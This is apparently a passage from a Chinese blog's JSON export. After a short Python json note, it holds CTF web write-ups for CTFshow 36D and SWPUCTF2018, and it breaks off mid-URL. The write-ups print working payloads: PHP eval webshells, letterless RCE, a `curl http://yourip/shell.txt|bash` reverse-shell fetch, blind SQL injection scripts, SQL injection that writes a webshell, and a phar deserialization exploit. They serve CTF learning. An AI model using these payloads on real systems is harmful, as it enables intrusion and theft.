json.loads\n\n将str类型的数据转成dict\n\n示例：\n\n```python\nimport json  \n  \ndata = {'name':'python','sex':'boy','age':18}  \n      \nresult = json.dumps(data) \nreverse = json.loads(result)  \n\nprint(type(data))\nprint(result)\nprint(type(result))\nprint(reverse)\nprint(type(reverse))\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710151244.png)\n\n##### json.load\n\n从文件中读取数据，将str类型的数据转成dict\n\n示例：\n\n```python\nimport json  \n \nfiletest = ('test.txt')  \n \nresult = json.load(open(filetest))   \n \nprint(result) \nprint(type(result)) \n```\n\n![image-20200710151612475](C:/Users/15363/AppData/Roaming/Typora/typora-user-images/image-20200710151612475.png)","tags":["serialize"],"categories":["python"]},{"title":"CTFshow36D杯web复现","url":"/2020/07/08/CTFshow_36D_wp/","content":"\n好早的比赛了。\n\n<!-- more -->\n\n### 你取吧\n\n打开靶机直接给出源码\n\n```php\n<?php\nerror_reporting(0);\nshow_source(__FILE__);\n$hint=file_get_contents('php://filter/read=convert.base64-encode/resource=hhh.php');\n$code=$_REQUEST['code'];\n$_=array('a','b','c','d','e','f','g','h','i','j','k','m','n','l','o','p','q','r','s','t','u','v','w','x','y','z','\\~','\\^');\n$blacklist = array_merge($_);\nforeach ($blacklist as $blacklisted) {\n    if (preg_match ('/' . $blacklisted . '/im', $code)) {\n        die('nonono');\n    }\n}\neval(\"echo($code);\");\n?>wu\n```\n\n`$hint`是hhh.php内容的base形式，可通过post或get方法传入code，`$_`是一个包含了所有小写字母和`~,^`的 数组并传递给了`$blacklist`，遍历`$blacklist`，如果匹配到了数组内的元素，输出nonono，执行传入的`$code`但有个echo挡了一下。\n\n#### 解1：数组下标取值\n\n由于并未过滤`$`和`[]`，可以用数组的下标数字把数组内的值取出来组合，比如`ls /`就变成了`$_[13]$_[18] /`，那么\n`$__：$_[18].$_[24].$_[18].$_[19].$_[4].$_[11] => system`\n`$___：$_[13].$_[18].' '.'/' => ls /`\n拼接一下即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707213715.png)\n\n`12)`闭合前面`echo(`，`(12`闭合后面的`)`\n不闭合也行，php中，反引号可以用来执行命令，比如echo\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707214159.png)\n\n那么也不需要点号拼接值了，直接执行\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707214350.png)\n\n构造相应的`cat /flag`即可\n\n#### 解2：位移运算符\n\nAscii表中，`'@'|'(任何左侧符号)'=='(右侧小写字母)'`，比如`'@'|'!'=='a'`,`'@'|'('=='h'`\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707220249.png)\n\n那么我们构造`'@@@@'|'().4'`就是hint，传入`($_ = '@@@@'|'().4') == 1?1:$$_`，如果`'@@@@'|'().4'!=1`，就会执行`$$_`，也就是echo出`$hint`\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707220607.png)\n\n解码得`<?php $a=\"/phpjiami.zip\\n/hint.php\"; ?>`，phpjiami.zip下载下来是一个混淆的php源码\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707220943.png)\n\n解码脚本：\n\n```\n<?php\n\nfunction decrypt($data, $key)\n{\n    $data_1 = '';\n    for ($i = 0; $i < strlen($data); $i++) {\n        $ch = ord($data[$i]);\n        if ($ch < 245) {\n            if ($ch > 136) {\n                $data_1 .= chr($ch / 2);\n            } else {\n                $data_1 .= $data[$i];\n            }\n        }\n    }\n    $data_1 = base64_decode($data_1);\n    $key = md5($key);\n    $j = $ctrmax = 32;\n    $data_2 = '';\n    for ($i = 0; $i < strlen($data_1); $i++) {\n        if ($j <= 0) {\n            $j = $ctrmax;\n        }\n        $j--;\n        $data_2 .=  $data_1[$i] ^ $key[$j];\n    }\n    return $data_2;\n}\n\nfunction find_data($code)\n{\n    $code_end = strrpos($code, '?>');\n    if (!$code_end) {\n        return \"\";\n    }\n    $data_start = $code_end + 2;\n    $data = substr($code, $data_start, -46);\n    return $data;\n}\n\nfunction find_key($code)\n{\n    // $v1 = $v2('bWQ1');\n    // $key1 = $v1('??????');\n    $pos1 = strpos($code, \"('\" . preg_quote(base64_encode('md5')) . \"');\");\n    $pos2 = strrpos(substr($code, 0, $pos1), '$');\n    $pos3 = strrpos(substr($code, 0, $pos2), '$');\n    $var_name = substr($code, $pos3, $pos2 - $pos3 - 1);\n    $pos4 = strpos($code, $var_name, $pos1);\n    $pos5 = strpos($code, \"('\", $pos4);\n    $pos6 = strpos($code, \"')\", $pos4);\n    $key = substr($code, $pos5 + 2, $pos6 - $pos5 - 2);\n    return $key;\n}\n\n$input_file = $argv[1];\n$output_file = $argv[1] . '.decrypted.php';\n\n$code = file_get_contents($input_file);\n\n$data = find_data($code);\nif (!$code) {\n    echo '未找到加密数据', PHP_EOL;\n    exit;\n}\n\n$key = find_key($code);\nif (!$key) {\n    echo '未找到秘钥', PHP_EOL;\n    exit;\n}\n\n$decrypted = decrypt($data, $key);\n$uncompressed = gzuncompress($decrypted);\n// 由于可以不勾选代码压缩的选项，所以这里判断一下是否解压成功，解压失败就是没压缩\nif ($uncompressed) {\n    $decrypted = str_rot13($uncompressed);\n} else {\n    $decrypted = str_rot13($decrypted);\n}\nfile_put_contents($output_file, $decrypted);\necho '解密后文件已写入到 ', $output_file, PHP_EOL;\n```\n\n`php 脚本.php 目标.php`即可解码\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707221641.png)\n\n解码有个一句话\n\n```\n?><?php @eval(\"//Encode by  phpjiami.com,Free user.\"); ?><?php\n$ch = explode(\".\",\"hello.ass.world.er.rt.e.saucerman\");\n$c = $ch[1].$ch[5].$ch[4]; \n@$c($_POST[7-1]);\n?>\n<?php \n```\n\n访问hint.php，6=system('cat /flag')即可\n\n#### 解3：无字母数字rce\n\np神文章：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\n\nPOST传入：\n\n```\n$_=[];$_=@\"$_\";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);\n\n_=system('cat /flag');\n```\n\n同样用`12)`，`(12`闭合echo，另外最好整个url编码一下，类型x-www-form-urlencoded\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707223453.png)\n\n\n\n### 给你shell\n\n打开靶机只有一句`I prepared a webshell for you`，源码处有隐藏跳转\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708081717.png)\n\n访问得源码\n\n```php\n<?php\n//It's no need to use scanner. Of course if you want, but u will find nothing.\nerror_reporting(0);\ninclude \"config.php\";\n\nif (isset($_GET['view_source'])) {\n    show_source(__FILE__);\n    die;\n}\n\nfunction checkCookie($s) {\n    $arr = explode(':', $s);\n    if ($arr[0] === '{\"secret\"' && preg_match('/^[\\\"0-9A-Z]*}$/', $arr[1]) && count($arr) === 2 ) {\n        return true;\n    } else {\n        if ( !theFirstTimeSetCookie() ) setcookie('secret', '', time()-1);\n        return false;\n    }\n}\n\nfunction haveFun($_f_g) {\n    $_g_r = 32;\n    $_m_u = md5($_f_g);\n    $_h_p = strtoupper($_m_u);\n    for ($i = 0; $i < $_g_r; $i++) {\n        $_i = substr($_h_p, $i, 1);\n        $_i = ord($_i);\n        print_r($_i & 0xC0);\n    }\n    die;\n}\n\nisset($_COOKIE['secret']) ? $json = $_COOKIE['secret'] : setcookie('secret', '{\"secret\":\"' . strtoupper(md5('y1ng')) . '\"}', time()+7200 );\ncheckCookie($json) ? $obj = @json_decode($json, true) : die('no');\n\nif ($obj && isset($_GET['give_me_shell'])) {\n    ($obj['secret'] != $flag_md5 ) ? haveFun($flag) : echo \"here is your webshell: $shell_path\";\n}\n\ndie;\n```\n\n`checkcookie`要求传入的cookie只能包含一对键值并且值只能是这个正则允许的字符\n`havefun`把传入的值md5处理，字母转换为大写并按位`&`运算，如果是数字和`0xC0`来`&`结果就是0，如果是字母则结果是64\n通过checkCookie则把cookie保存在`$obj`\n如果cookie中secret的值和`$flag_md5`相等，则给出`shell_path`，不等则调用havefun\n\n#### 解题\n\nget传入`give_me_shhell`，给出了havafun处理后的结果\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708105953.png)\n\n可以看到前三位都是0，那么前三位都是数字，从第四位开始有字母，由于`!=`是弱比较，因此只要数值和字符串的前三位相等，php就会返回true，那么爆破一下即可。\n\n```pythpn\nimport requests\nurl = \"http://9a0e6a1b-5544-4e24-bcc8-3e31e1701c52.chall.ctf.show/?give_me_shell\"\ns = requests.session()\nfor i in range(10):\n        for j in range(10):\n                for k in range(10):\n                        headers = {\n                                'cookie':'secret={\"secret\": '+str(i)+str(j)+str(k)+'}'\t\t\n\t\t\t                      }\n                        res = s.get(url,headers = headers)\n                        if \"here is your\" in res.text:\n                                print(headers)\n                                break\n```\n\n得到115，构造`{\"secret\": 115}`替换原来的cookie即可，刷新得到`$shell_path`\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708111256.png)\n\n访问又得源码\n\n```\n<?php\nerror_reporting(0);\nsession_start();\n\n//there are some secret waf that you will never know, fuzz me if you can\nrequire \"hidden_filter.php\";\n\nif (!$_SESSION['login'])\n    die('<script>location.href=\\'./index.php\\'</script>');\n\nif (!isset($_GET['code'])) {\n    show_source(__FILE__);\n    exit();\n} else {\n    $code = $_GET['code'];\n    if (!preg_match($secret_waf, $code)) {\n        //清空session 从头再来\n        eval(\"\\$_SESSION[\" . $code . \"]=false;\"); //you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker\n    } else die('hacker');\n}\n\n/*\n * When you feel that you are lost, do not give up, fight and move on.\n * Being a hacker is not easy, it requires effort and sacrifice.\n * But remember … we are legion!\n *  ————Deep CTF 2020\n*/\n```\n\n黑名单不可见需要自己测试，如果没有session会跳转，eval只能执行session\n\nfuzz后过滤内容:\n\n> f、sys、include\n> 括号、引号、分号\n> ^ &等运算符\n> 空格 / \\ $ ` * #等符号\n\npayload：`]=1?><?=require~%d0%99%93%9e%98%d1%8b%87%8b?>`\n\n`]=1`把`$_SESSION`闭合，由于分号被过滤使用`?><?`来bypass，取反`~%d0%99%93%9e%98%d1%8b%87%8b => /flag.txt`，require函数可以不需要括号并且由于PHP黑魔法 `require`和取反运算符之间也不需要空格就能执行，最后`?>`闭合\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708114503.png)\n\n同样方法构造即可，payload：`]=1?><?=require~%d0%99%93%9e%98?>`\n\n### RemoteImageDownloader\n\n打开靶机一个提交框可以访问外网文件，考点是PhantomJS任意文件读取\n\n在[y1ng师傅](https://www.gem-love.com/ctf/2127.html#Screenshoter(469))文章里找到[参考文章](https://web.archive.org/web/20191220171022/https://www.darkmatter.ae/blogs/breaching-the-perimeter-phantomjs-arbitrary-file-read/)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708133153.png)\n\n#### 解题\n\n在自己的服务器上创建个文件读本地flag，内容如下：\n\n```html\n<html>\n\t<head>\n\t<body>\n\t<script>\n\tx=new XMLHttpRequest;\n\tx.onload=function(){\n\tdocument.write(this.responseText)\n\t};\n\tx.open(\"GET\",\"file:///flag\");\n\tx.send();\n\t</script>\n\t</body>\n\t</head>\n</html>\n```\n\n访问该文件地址，得到图片flag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708134540.png)\n\n### WEB_ALL_INFO_U_WANT\n\n打开靶机可以玩魔方，源码处发现注释\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708135153.png)\n\n扫描之后发现备份文件\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708135349.png)\n\n下载后源码如下\n\n```\n\nvisit all_info_u_want.php and you will get all information you want\n\n= =Thinking that it may be difficult, i decided to show you the source code:\n\n<?php\nerror_reporting(0);\n\n//give you all information you want\nif (isset($_GET['all_info_i_want'])) {\n    phpinfo();\n}\n\nif (isset($_GET['file'])) {\n    $file = \"/var/www/html/\" . $_GET['file'];\n    //really baby include\n    include($file);\n}\n?>\n```\n\n传入`all_info_i_want`显示phpinfo，包含传入的file。\n\n#### 解1：日志文件包含\n\nnginx日志默认路径是`/var/log/nginx/access.log`\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708140634.png)\n\n往User-Agent写入一句话\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708142533.png)\n\n再用蚁剑连接即可，但这里文件不容易找，所以反弹shell到自己服务器\n`a=system('curl http://yourip/shell.txt|bash');`\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708143045.png)\n\n直接搜flag文件名找不到，学到了新的flag搜索方式，即搜索文件内容\n`find /etc -name \"*\" | xargs grep \"flag{\"`\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708143153.png)\n\n#### 解2：临时文件包含\n\nphp会在脚本执行结束后删掉临时文件，通过自身包含自身使之进入死循环，打断死循环让php执行不结束，临时文件就保存下来了\n构造上传表单\n\n```\n<html>\n<form action=\"http://96013011-1e57-4c9c-b295-bba1c7e3c44d.chall.ctf.show/all_info_u_want.php?file=all_info_u_want.php&all_info_i_want\" method=\"post\" enctype=\"multipart/form-data\">\n    <input type=\"file\" name=\"filename\">\n    <input type=\"submit\" value=\"提交\">\n</form>\n</body>\n</html>\n```\n\n上传一句话文件\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708144734.png)\n\n跳转之后手动停掉死循环\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708144844.png)\n\n就可以看到临时文件路径了\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708145037.png)\n\n包含它即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708145300.png)\n\n### WUSTCTF朴实无华_Revenge\n\nwustctf朴实无华的改版\n\n#### 解题\n\nlevel 1\n\n```\nif (isset($_GET['num'])){\n    $num = $_GET['num'];\n    $numPositve = intval($num);\n    $numReverse = intval(strrev($num));\n    if (preg_match('/[^0-9.]/', $num)) {\n        die(\"非洲欢迎你1\");\n    } else {\n        if ( (preg_match_all(\"/\\./\", $num) > 1) || (preg_match_all(\"/\\-/\", $num) > 1) || (preg_match_all(\"/\\-/\", $num)==1 && !preg_match('/^[-]/', $num))) {\n            die(\"没有这样的数\");\n        }\n    }\n    if ($num != $numPositve) {\n        die('最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve');\n    }\n\n    if ($numPositve <= -999999999999999999 || $numPositve >= 999999999999999999) { //在64位系统中 intval()的上限不是2147483647 省省吧\n        die(\"非洲欢迎你2\");\n    }\n    if( $numPositve === $numReverse && !isPalindrome($num) ){\n        echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>\";\n    }else{\n        die(\"金钱解决不了穷人的本质问题\");\n    }\n}else{\n    die(\"去非洲吧\");\n}\n```\n\n满足` $numPositve = intval($num);$numReverse = intval(strrev($num));`的同时需满足\n\n```\nif ($num != $numPositve)  ==> \t传整数\nif ($numPositve <= -999999999999999999 || $numPositve >= 999999999999999999)\t==>\t不能int溢出\t\nif( $numPositve === $numReverse && !isPalindrome($num) )\t==>\t\t不能是回文又要有回文的特点对称\n```\n\npayload：`?num=1000000000000000.00000000000000010`\n\nnum是弱类型判断，且php存在浮点精度问题，所以php中`1000000000000000.0000000000000001=1000000000000000`是成立的\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708155152.png)\n\n再加个0满足倒过来相等，且不是一个回文数\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708155302.png)\n\nlevel2\n\n```php\nif (isset($_GET['md5'])){\n    $md5=$_GET['md5'];\n    if ($md5==md5(md5($md5)))\n        echo \"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>\";\n    else\n        die(\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\");\n}else{\n    die(\"去非洲吧\");\n}\n```\n\n满足` if ($md5==md5(md5($md5)))`，由于是弱类型，所以构造一个以0e开头，经过两次md5之后依然还是以0e开头的纯数字串，这样利用科学计数法的特性在php中弱类型相等\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708155800.png)\n\n这里直接用y1ng师傅的脚本：\n\n```python\nimport hashlib\n\nfor i in range(0,10**33):\n    i = str(i)\n    num = '0e' + i\n    md5 = hashlib.md5(num.encode()).hexdigest()\n    md5 = hashlib.md5(md5.encode()).hexdigest()\n    # print(md5)\n    if md5[0:2] == '0e' and md5[2:].isdigit():\n        print('success str:{}  md5(str):{}'.format(num, md5))\n        break\n    else:\n        if int(i) % 1000000 == 0:\n         print(i)\n```\n\n得到`0e1138100474`\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708160006.png)\n\nget flag\n\n```php\nif (isset($_GET['get_flag'])){\n    $get_flag = $_GET['get_flag'];\n    if(!strstr($get_flag,\" \")){\n        $get_flag = str_ireplace(\"cat\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"more\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"tail\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"less\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"head\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"tac\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"sort\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"nl\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"$\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"curl\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"bash\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"nc\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"php\", \"36dCTFShow\", $get_flag);\n        if (preg_match(\"/['\\*\\\"[?]/\", $get_flag)) {\n            die('非预期修复*2');\n        }\n        echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>\";\n        system($get_flag);\n    }else{\n        die(\"快到非洲了\");\n    }\n}else{\n    die(\"去非洲吧\");\n}\n```\n\n过滤了一些关键字，用一些字符阻断即可，比如ca\\t<flag.p\\hp\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708160311.png)\n\nflag在源码里\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708160335.png)\n\n### WEB_Login_Only_For_36D\n\n打开靶机一个登录框\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708160819.png)\n\n源码直接给了sql语句\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708161156.png)\n\n只要用户名含有admin，那么就不会die\n\nsql语句可以用`\\`来操作，本来的语句是\n\n`select * from 36d_user where username='admin' and password='sql';`\n\n我们把用户名设为`admin\\`，这样，原来的`'`就被注明为一个文本符号，用户名就变成了`admin' and password=`\n\n`select * from 36d_user where username='admin\\' and password='sql';`\n\n再加个#把后面注释，这样传入的`$passwd`就可以逃逸出来，执行sql语句了\n\n#### 解题\n\nfuzz一下发现select，union，ascii，空格，分号等等很多东西都被过滤了，但是sleep，regexp，binary没被过滤，因此有可能是时间盲注。\n\nsubstr，mid啥的都过滤了，后来想到可以用right，left一起用来代替substr\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708173622.png)\n\n正好'^'也没过滤，可以尝试异或\n\n当password是`^if(ord(right(left(password,1),1))like(35),sleep(4),1)#`时\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708174923.png)\n\n当password是`^if(ord(right(left(password,1),1))like(73),sleep(4),1)#`时\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708175013.png)\n\n直到四秒才返回，证明时间盲注可行\n\n构造脚本\n\n```php\nimport requests\nurl=\"http://109b8f92-8675-4edc-a4b7-c6005bf771f9.chall.ctf.show/\"\nk=\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\nflag=\"\"\nfor i in range(20): \n    for j in k:\n        j = ord(j)\n        data={\n            'username':'admin\\\\',\n            'password':'^if(ord(right(left(password,{0}),1))like({1}),sleep(4),1)#'.format(i,j)\n            }\n        try:\n            r=requests.post(url,data=data,timeout=(2,2))\n        except:\n            flag+=chr(j)\n            print(flag)\n            break\n```\n\n跑一会儿\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708173747.png)\n\n登录即得flag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708174012.png)\n\n### 你没见过的注入\n\n打开靶机绝美前端\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708175956.png)\n\n根据提示打开robots.txt，得到`/pwdreset.php`，可以重置密码，重置之后登录发现是个上传\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708180221.png)\n\n测试一下发现会将上传文件存储为压缩包，并显示文件类型，\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708180434.png)\n\n#### 解题\n\n试了把sql语句写入文件名等等，都不起效果，当时记得还是阿狸师傅提醒了一下\n\n版权信息注入（真*活久见）\n\n测试一下，找一张jpg，用exiftools把语句写进comment\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708184343.png)\n\n上传，发现报错，把插入语句以及Sql报错信息显示了出来\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708184328.png)\n\n 那么可以注入了，构造`\"');select 0x3c3f70687020406576616c28245f504f53545b2761275d293b3f3e into outfile '/var/www/html/blacknight.php';--+`把一句话写进\n\n但写入的时候显示不全\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708184936.png)\n\n所以换一个短的一句话：`\"');select 0x3c3f3d60245f504f53545b315d603b into outfile '/var/www/html/blacknight.php';--+`\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708185939.png)\n\n上传之后访问php，post一下即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708190019.png)","tags":["sql","bypass","RCE","ssrf"],"categories":["CTF"]},{"title":"SWPUCTF2018——SimplePHP","url":"/2020/07/05/[SWPUCTF 2018]SimplePHP/","content":"\n平台：buuoj.cn\n\n打开靶机有上传和查看文件功能\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200705104918151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n观察到查看文件url\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200705104947738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n可以直接读取文件内容\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200705105028285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n将各个文件源码复制下来主要有以下文件\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200705105355660.png)\n###### 考点：phar文件上传\n先来看class.php，有三个类\nC1e4r类对象创建时`$name`传递给`$str`，对象销毁时`$str->$test`并输出`$test`\n```php\nclass C1e4r\n{\n    public $test;\n    public $str;\n    public function __construct($name)\n    {\n        $this->str = $name;\n    }\n    public function __destruct()\n    {\n        $this->test = $this->str;\n        echo $this->test;\n    }\n}\n```\nshow类对象创建时`$file`传递给`$source`并输出，对象被转化为字符串时访问`$source`传递给`content`并返回，给未定义属性赋值时将`$value`传递给`$key`，`_show`和`__wakeup`过滤了一些协议\n```php\nclass Show\n{\n    public $source;\n    public $str;\n    public function __construct($file)\n    {\n        $this->source = $file;   //$this->source = phar://phar.jpg\n        echo $this->source;\n    }\n    public function __toString()\n    {\n        $content = $this->str['str']->source;\n        return $content;\n    }\n    public function __set($key,$value)\n    {\n        $this->$key = $value;\n    }\n    public function _show()\n    {\n        if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this->source)) {\n            die('hacker!');\n        } else {\n            highlight_file($this->source);\n        }\n        \n    }\n    public function __wakeup()\n    {\n        if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker~\";\n            $this->source = \"index.php\";\n        }\n    }\n}\n```\nTest类\n创建对象时`$params`转化为数组，当调用未定义的属性或没有权限访问的属性时`__get`方法触发，调用get函数，get函数的`$key`传递给file_get函数的`$value`，file_get函数再将`$value`经过file_get_contents函数处理和base64编码传递给`$test`并输出。\n```php\nclass Test\n{\n    public $file;\n    public $params;\n    public function __construct()\n    {\n        $this->params = array();\n    }\n    public function __get($key)\n    {\n        return $this->get($key);\n    }\n    public function get($key)\n    {\n        if(isset($this->params[$key])) {\n            $value = $this->params[$key];\n        } else {\n            $value = \"index.php\";\n        }\n        return $this->file_get($value);\n    }\n    public function file_get($value)\n    {\n        $text = base64_encode(file_get_contents($value));\n        return $text;\n    }\n}\n?>\n```\n分析完我们应当是想通过file_get_content来读取我们想要的文件，也就是调用file_get函数，之前分析得知`__get->get->file_get`，所以关键是触发`__get`方法，那么就要外部访问一个Test类没有或不可访问的属性，我们注意到前面Show类的`__tostring`方法\n\n```php\n    public function __toString()\n    {\n        $content = $this->str['str']->source;\n        return $content;\n    }\n```\n访问对象的souce属性，而Test类中是没有这个属性的，让它来访问Test即可触发`__get`方法，那么现在的问题变成了`__tostring`的触发，看C1e4r类中的`__destruct`类\n\n```php\n    public function __destruct()\n    {\n        $this->test = $this->str;\n        echo $this->test;\n    }\n```\necho出`test`正好可以触发`__tostring`\n整个pop链就是`C1e4r::destruct() -> Show::toString() -> Test::__get()`\nexp：\n\n```php\n<?php\nclass C1e4r\n{\n    public $test;\n    public $str;\n}\n\nclass Show\n{\n    public $source;\n    public $str;\n}\nclass Test\n{\n    public $file;\n    public $params;\n\n}\n\n$a = new C1e4r();\n$b = new Show();\n$c = new Test();\n$c->params['source'] = \"/var/www/html/f1ag.php\";//目标文件\n$a->str = $b;   //触发__tostring\n$b->str['str'] = $c;  //触发__get;\n\n\n$phar = new Phar(\"exp.phar\"); //生成phar文件\n$phar->startBuffering();\n$phar->setStub('<?php __HALT_COMPILER(); ? >');\n$phar->setMetadata($a); //触发头是C1e4r类\n$phar->addFromString(\"exp.txt\", \"test\"); //生成签名\n$phar->stopBuffering();\n\n?>\n```\n上传提示无效，再看一下源码发现限制了上传后缀\n`$allowed_types = array(\"gif\",\"jpeg\",\"jpg\",\"png\"); `\n那么抓包改一下后缀绕过就行，随便一个，反正上传之后文件名都会改\n`$filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; `\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200705120158350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n上传成功之后可以在upload目录下看到上传的文件\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200705120343826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n复制下文件名，用phar协议触发使得phar文件生效\n`phar://upload/8adc336297a3d5eb2550edc08aa372a8.jpg\t`\n那么现在看在哪传，看到file.php\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200705120548616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\nfile_exists检查文件或目录是否存在，存在则调用`_show`函数，也就是class.php中的`_show`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200705120757911.p